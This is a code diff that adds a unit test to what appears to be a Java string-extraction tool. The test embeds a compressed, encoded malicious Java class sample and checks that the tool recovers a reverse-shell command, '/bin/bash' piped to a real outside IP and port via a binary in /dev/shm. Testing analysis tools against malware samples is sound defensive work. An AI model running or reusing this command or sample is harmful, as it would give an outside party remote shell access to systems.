@@ -50,3 +50,16 @@ class TestJavaStrings(TestUnitBase):
             '𠜎𠜱𠝹𠱓𠱸𠲖𠳏𠳕𠴕𠵼𠵿𠸎𠸏𠹷𠺝𠺢𠻗𠻹𠻺𠼭𠼮𠽌𠾴𠾼𠿪𡁜𡁯𡁵𡁶𡁻𡃁𡃉𡇙𢃇𢞵𢫕𢭃𢯊𢱑𢱕𢳂𢴈𢵌𢵧𢺳𣲷𤓓𤶸𤷪𥄫𦉘𦟌𦧲𦧺𧨾𨅝𨈇𨋢𨳊𨳍𨳒𩶘',
             (t.decode('utf8') for t in unit.process(data))
         )
+
+    def test_exploit_class(self):
+        unit = self.load()
+        data = lzma.decompress(base64.b85decode(
+            '{Wp48S^xk9=GL@E0stWa8~^|S5YJf5-~>Yg8eIToKa)$~28$(3D!jcx;_K|waX7xL$=-@sHm5gCL{oYGxzC+T=POaOBL@&Hau#lN;)1wG0MnRj#Q(@CHRJ5c'
+            'x0E&9vHRJNd{C*qIm4qdl}iUU`h`Rc(7RU$K+-=!W9cFWz2yXAb?={{OoKNdkF2bJ=}{J0%=HwuUKr-$=ISPXqGCoUtrTwl<brY&8yzYY)N)W6QHW6{)&m!T'
+            'ls()V>dm#mfI)3#%by<-8%07$e7Fq2t8qm52LoF(=K{~Mi2N{H%aP5z5`ewUDUDtk=KX30;}DvcMlSNs2kR-91`La(?nXK;8A=mIf!m08HxyIa6>LG8@{Ixi'
+            'XLK+CP^RBItY2D680JG&NqDHN!7}0Q#w_TvEi6V}7{j+dDnBe8N2s&!Gey1w3H+umgEfYiTIXz#`W`44_!J-VQ7ei?3yuHR|1?KTZs3CkwLvt9*yV%vfXKLc'
+            '0rN7Qh@lr@Y42h^U_AWZ2sB5szleogRKSDj+x>@&H_lwBxiFKRD%|L0D|=1Lc%{B~W3mR96t!ktK0kjSQ<HIb!(`8AG(Mn0Fq^a8XViIxRFr<JE~hP|&0?L&'
+            'TEXn77ziu3bYy`;e&&b&u%Y19)<`DMU6Ih^OEjH;{H}3WZ-S%O6<qgy7i39*P?yKvr0evzl^)!zEjP-<_PqDu%519r_Et=9rb|Ei1qOigUM&-!-~a#swru(a'
+            '49{3K00FiH#0UTYoT_>avBYQl0ssI200dcD'
+        ))
+        self.assertEqual(str(data | unit).strip(), '/dev/shm/n -e /bin/bash 194.165.16''.24 8227')
